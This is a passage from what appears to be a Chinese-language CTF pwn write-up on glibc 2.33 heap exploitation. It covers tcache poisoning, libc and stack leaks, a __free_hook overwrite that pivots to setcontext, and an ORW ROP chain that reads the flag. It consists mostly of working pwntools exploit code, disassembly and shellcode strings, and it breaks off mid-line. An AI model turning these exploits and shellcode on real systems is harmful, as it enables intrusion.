1 - 7</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>delete(i+<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># leak libc</span><br>delete(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">9</span>)<span class="hljs-comment"># LOWORD(fd)=0x00,fill fd-&gt;LOWORD(bk)</span><br>show(<span class="hljs-number">0</span>)<span class="hljs-comment"># leak bk</span><br>libc_base = uu64() - <span class="hljs-number">0x1e0c61</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br>environ = libc_base + libc.sym[<span class="hljs-string">&#x27;environ&#x27;</span>]<br>op = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>rd = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>pt = libc_base + libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;environ&#x27;</span>)<br>pop_rdi = libc_base + <span class="hljs-number">0x0000000000028a55</span><br>pop_rsi = libc_base + <span class="hljs-number">0x000000000002a4cf</span><br>pop_rdx_r12 = libc_base + <span class="hljs-number">0x0000000000112a51</span><br><br><span class="hljs-comment"># leak tcache</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>add()<span class="hljs-comment"># 8 - 13</span><br>show(<span class="hljs-number">1</span>)<br>sh.recv()<br><span class="hljs-built_in">next</span> = u64(sh.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;next&#x27;</span>)<br><br><span class="hljs-comment"># leak stack</span><br>fake_next = <span class="hljs-built_in">next</span> ^ environ<br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">8</span>, <span class="hljs-number">2</span>, p64(fake_next))<br>add() <span class="hljs-comment"># 14</span><br>add() <span class="hljs-comment"># 15</span><br>show(<span class="hljs-number">15</span>)<br>leak_stack = uu64()<br>lg(<span class="hljs-string">&#x27;leak_stack&#x27;</span>)<br>fake_addr = leak_stack - <span class="hljs-number">0x110</span><br>lg(<span class="hljs-string">&#x27;fake_addr&#x27;</span>)<br><br><span class="hljs-comment"># make rop</span><br>delete(<span class="hljs-number">8</span>)<br>delete(<span class="hljs-number">9</span>)<br>fake_next = <span class="hljs-built_in">next</span> ^ fake_addr<br>edit(<span class="hljs-number">8</span>, <span class="hljs-number">9</span>, p64(fake_next))<br>add() <span class="hljs-comment"># 16</span><br><span class="hljs-comment"># dbg()</span><br>add() <span class="hljs-comment"># 17</span><br><br>owr = <span class="hljs-string">b&#x27;flag\x00&#x27;</span><br>owr = owr.ljust(<span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>owr += p64(pop_rdi) + p64(fake_addr) + p64(op)<br>owr += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(fake_addr + <span class="hljs-number">0x100</span>) + p64(pop_rdx_r12) + p64(<span class="hljs-number">0x30</span>)*<span class="hljs-number">2</span> + p64(rd)<br>owr += p64(pop_rdi) + p64(fake_addr + <span class="hljs-number">0x100</span>) + p64(pt)<br>edit(<span class="hljs-built_in">len</span>(owr), <span class="hljs-number">17</span>, owr)<br>sh.recv()<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h3 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext"></a>setcontext</h3><p>这道题目是libc2.33的，还未禁用hook函数，我们可以覆盖hook函数为libc中的setcontext，实现owr。</p><blockquote><p>参考文章：<a href="https://blog.csdn.net/A951860555/article/details/118268484">(8条消息) pwn题堆利用的一些姿势 – setcontext___lifanxin的博客-CSDN博客_setcontext</a></p></blockquote><p>在这里可以用IDA查看setcontext中的内容，这里我们需要的汇编片段的偏移是0x3d，如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052970</span> F3 0F 1E FA                   endbr64<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052974</span> <span class="hljs-number">57</span>                            <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rdi</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052975</span> <span class="hljs-number">48</span> <span class="hljs-number">8D</span> B7 <span class="hljs-number">28</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">128h</span>]       <span class="hljs-comment">; nset</span><br><span class="hljs-symbol">.text:</span>000000000005297C <span class="hljs-number">31</span> D2                         <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">edx</span>              <span class="hljs-comment">; oset</span><br><span class="hljs-symbol">.text:</span>000000000005297E BF <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-number">2</span>                <span class="hljs-comment">; how</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052983</span> <span class="hljs-number">41</span> BA <span class="hljs-number">08</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>             <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r10d</span>, <span class="hljs-number">8</span>               <span class="hljs-comment">; sigsetsize</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052989</span> B8 0E <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0Eh</span><br><span class="hljs-symbol">.text:</span>000000000005298E 0F <span class="hljs-number">05</span>                         <span class="hljs-keyword">syscall</span>                       <span class="hljs-comment">; LINUX - sys_rt_sigprocmask</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052990</span> 5A                            <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">rdx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052991</span> <span class="hljs-number">48</span> <span class="hljs-number">3D</span> <span class="hljs-number">01</span> F0 FF FF             <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-number">0FFFFFFFFFFFFF001h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052997</span> 0F <span class="hljs-number">83</span> <span class="hljs-number">22</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>             <span class="hljs-keyword">jnb</span>     loc_52ABF<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052997</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000005299D</span> <span class="hljs-number">48</span> 8B 8A E0 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0E0h</span>]<br><span class="hljs-symbol">.text:</span>00000000000529A4 D9 <span class="hljs-number">21</span>                         <span class="hljs-keyword">fldenv</span>  <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span>]<br><span class="hljs-symbol">.text:</span>00000000000529A6 0F AE <span class="hljs-number">92</span> C0 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">ldmxcsr</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">1C0h</span>]<br><span class="hljs-symbol">.text:</span>00000000000529AD <span class="hljs-number">48</span> 8B A2 A0 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsp</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0A0h</span>]# 嘿，我在这里！！<br><span class="hljs-symbol">.text:</span>00000000000529B4 <span class="hljs-number">48</span> 8B 9A <span class="hljs-number">80</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbx</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">80h</span>]<br><span class="hljs-symbol">.text:</span>00000000000529BB <span class="hljs-number">48</span> 8B 6A <span class="hljs-number">78</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbp</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">78h</span>]<br><span class="hljs-symbol">.text:</span>00000000000529BF 4C 8B <span class="hljs-number">62</span> <span class="hljs-number">48</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r12</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">48h</span>]<br><span class="hljs-symbol">.text:</span>00000000000529C3 4C 8B 6A <span class="hljs-number">50</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r13</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">50h</span>]<br><span class="hljs-symbol">.text:</span>00000000000529C7 4C 8B <span class="hljs-number">72</span> <span class="hljs-number">58</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r14</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">58h</span>]<br><span class="hljs-symbol">.text:</span>00000000000529CB 4C 8B 7A <span class="hljs-number">60</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r15</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">60h</span>]<br><span class="hljs-symbol">.text:</span>00000000000529CF <span class="hljs-number">64</span> F7 <span class="hljs-number">04</span> <span class="hljs-number">25</span> <span class="hljs-number">48</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span>+<span class="hljs-keyword">test</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">fs</span>:<span class="hljs-number">48h</span>, <span class="hljs-number">2</span><br><span class="hljs-symbol">.text:</span>00000000000529CF <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">.text:</span>00000000000529<span class="hljs-built_in">DB</span> 0F <span class="hljs-number">84</span> B5 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>             <span class="hljs-keyword">jz</span>      loc_52A96<br><span class="hljs-symbol"></span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">.text:</span>0000000000052A96                               loc_52A96:                    <span class="hljs-comment">; CODE XREF: setcontext+6B↑j</span><br><span class="hljs-symbol">.text:</span>0000000000052A96 <span class="hljs-number">48</span> 8B 8A A8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0A8h</span>]<br><span class="hljs-symbol">.text:</span>0000000000052A9D <span class="hljs-number">51</span>                            <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rcx</span><br><span class="hljs-symbol">.text:</span>0000000000052A9E <span class="hljs-number">48</span> 8B <span class="hljs-number">72</span> <span class="hljs-number">70</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">70h</span>]<br><span class="hljs-symbol">.text:</span>0000000000052AA2 <span class="hljs-number">48</span> 8B 7A <span class="hljs-number">68</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">68h</span>]<br><span class="hljs-symbol">.text:</span>0000000000052AA6 <span class="hljs-number">48</span> 8B 8A <span class="hljs-number">98</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">98h</span>]<br><span class="hljs-symbol">.text:</span>0000000000052<span class="hljs-keyword">AAD</span> 4C 8B <span class="hljs-number">42</span> <span class="hljs-number">28</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r8</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">28h</span>]<br><span class="hljs-symbol">.text:</span>0000000000052AB1 4C 8B 4A <span class="hljs-number">30</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r9</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">30h</span>]<br><span class="hljs-symbol">.text:</span>0000000000052AB5 <span class="hljs-number">48</span> 8B <span class="hljs-number">92</span> <span class="hljs-number">88</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">88h</span>]<br><span class="hljs-symbol">.text:</span>0000000000052AB5                               <span class="hljs-comment">; &#125; // starts at 52970</span><br><span class="hljs-symbol">.text:</span>0000000000052ABC                               <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span>0000000000052ABC <span class="hljs-number">31</span> C0                         <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>0000000000052ABE C3                            <span class="hljs-keyword">retn</span><br><span class="hljs-symbol">.text:</span>0000000000052ABE<br></code></pre></td></tr></table></figure><p>需要注意的是：这里和上面给的参考文章有区别，一是偏移不一样，另外最重要的是，本人给出的汇编是以rdx为基础去找偏移，而参考文章是以rdi为基础去找偏移，所以我们需要一段gadget将rdi中的值转化为rdx，并且我们还需要控制程序执行流执行setcontext。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">ROPgadget --binary libc.so.6 --only &#x27;mov|call&#x27; | grep rdx<br>找到以下一个片段：<br>mov rdx, dword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]<br></code></pre></td></tr></table></figure><p>可以首先覆盖hook函数为这一段gadget，然后通过控制malloc和free堆块其中内容的布局，使得下一次<code>call qword ptr [rdx + 0x20]</code>的时候能够执行我们的setcontext，同时基于rdx布置好我们的orw，尤其要注意rsp的变化。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding = utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span> :<br>sh = process([<span class="hljs-string">b&quot;./ld.so&quot;</span>, <span class="hljs-string">b&quot;./pwn&quot;</span>], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : <span class="hljs-string">b&quot;./libc.so.6&quot;</span>&#125;)<br><span class="hljs-keyword">elif</span> local == <span class="hljs-number">2</span> :<br>    sh = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-keyword">else</span> :<br>sh = remote(ip, port)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(sh)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">slibc</span>(<span class="hljs-params">leak_name, leak_addr, flag = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> flag == <span class="hljs-number">0</span> :<br>        libc_base = leak_addr - libc.symbols[<span class="hljs-built_in">str</span>(leak_name)]<br>        sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>        bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>    <span class="hljs-keyword">else</span> :<br>        libcsch = LibcSearcher(<span class="hljs-built_in">str</span>(leak_name), leak_addr)<br>        libc_base = leak_addr - libcsch.dump(<span class="hljs-built_in">str</span>(leak_name))<br>        sys_addr = libc_base + libcsch.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>        bin_sh = libc_base + libcsch.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> [sys_addr, bin_sh]<br><br>s       = <span class="hljs-keyword">lambda</span> data               :sh.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> text, data         :sh.sendafter(text, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :sh.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> text, data         :sh.sendlineafter(text, data)<br>r       = <span class="hljs-keyword">lambda</span> num                :sh.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> text               :sh.recvuntil(text)<br>uu32    = <span class="hljs-keyword">lambda</span>                    :u32(sh.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span>                    :u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg      = <span class="hljs-keyword">lambda</span> s                  :sh.success(<span class="hljs-string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>sh_x86_18=<span class="hljs-string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x86_20=<span class="hljs-string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x64_21=<span class="hljs-string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span><br><span class="hljs-comment">#https://www.exploit-db.com/shellcodes</span><br><br><span class="hljs-comment">#------------------------------------------------------------------------------------------------------#</span><br><span class="hljs-comment"># set solib-search-path /home/zyy/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">size, index, context</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br>sla(<span class="hljs-string">&quot;Size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>sa(<span class="hljs-string">&quot;Content: &quot;</span>, context)<br><br><span class="hljs-comment"># fill tcache</span><br>add() <span class="hljs-comment"># 0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>add() <span class="hljs-comment"># 1 - 7</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>delete(i+<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># leak libc</span><br>delete(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">9</span>)<span class="hljs-comment"># LOWORD(fd)=0x00,fill fd-&gt;LOWORD(bk)</span><br>show(<span class="hljs-number">0</span>)<span class="hljs-comment"># leak bk</span><br>libc_base = uu64() - <span class="hljs-number">0x1e0c61</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br>op = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>rd = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>pt = libc_base + libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;op&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;rd&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;pt&#x27;</span>)<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;free_hook&#x27;</span>)<br>setcontext += <span class="hljs-number">61</span><br>lg(<span class="hljs-string">&#x27;setcontext&#x27;</span>)<br>pop_rdi = libc_base + <span class="hljs-number">0x0000000000028a55</span><br>pop_rsi = libc_base + <span class="hljs-number">0x000000000002a4cf</span><br>pop_rdx = libc_base + <span class="hljs-number">0x00000000000c7f32</span><br>ret = libc_base + <span class="hljs-number">0x0000000000026699</span><br>magic = libc_base + <span class="hljs-number">0x000000000014a0a0</span><br>lg(<span class="hljs-string">&#x27;magic&#x27;</span>)<br><span class="hljs-comment"># mov rdx, dword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span><br><br><span class="hljs-comment"># leak tcache</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>add()<span class="hljs-comment"># 8 - 13</span><br>show(<span class="hljs-number">1</span>)<br>sh.recv()<br><span class="hljs-built_in">next</span> = u64(sh.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;next&#x27;</span>)<br>heap_base = <span class="hljs-built_in">next</span> &lt;&lt; <span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>)<br><br><span class="hljs-comment"># change free_hook-&gt;magic</span><br>fake_next = <span class="hljs-built_in">next</span> ^ free_hook<br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">8</span>, <span class="hljs-number">2</span>, p64(fake_next))<br>add() <span class="hljs-comment"># 14</span><br>add() <span class="hljs-comment"># 15</span><br>pld = p64(magic)*<span class="hljs-number">2</span><br>edit(<span class="hljs-built_in">len</span>(pld), <span class="hljs-number">15</span>, pld)<br><br><span class="hljs-comment"># orw </span><br>flag_addr = heap_base + <span class="hljs-number">0x4c0</span><br>lg(<span class="hljs-string">&#x27;flag_addr&#x27;</span>)<br>owr = <span class="hljs-string">b&#x27;/flag\x00\x00\x00&#x27;</span> + p64(<span class="hljs-number">0</span>)    <span class="hljs-comment"># push rcx-&gt;overflow p64(0)</span><br>owr += p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(op)<br>owr += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_base + <span class="hljs-number">0x800</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>) + p64(rd)<br>owr += p64(pop_rdi) + p64(heap_base + <span class="hljs-number">0x800</span>) +p64(pt)<br>edit(<span class="hljs-built_in">len</span>(owr), <span class="hljs-number">2</span>, owr)<br><br><span class="hljs-comment"># setcontext</span><br>dest = heap_base + <span class="hljs-number">0x5d0</span> - <span class="hljs-number">0x20</span><br>pld = p64(setcontext) + p64(dest)       <br>pld = pld.ljust(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pld += p64(flag_addr + <span class="hljs-number">0x10</span>)   <span class="hljs-comment"># rsp-&gt;orw</span><br>pld += p64(ret)     <span class="hljs-comment"># rcx-&gt;ret</span><br>edit(<span class="hljs-built_in">len</span>(pld), <span class="hljs-number">3</span>, pld)<br><span class="hljs-comment"># dbg()</span><br>delete(<span 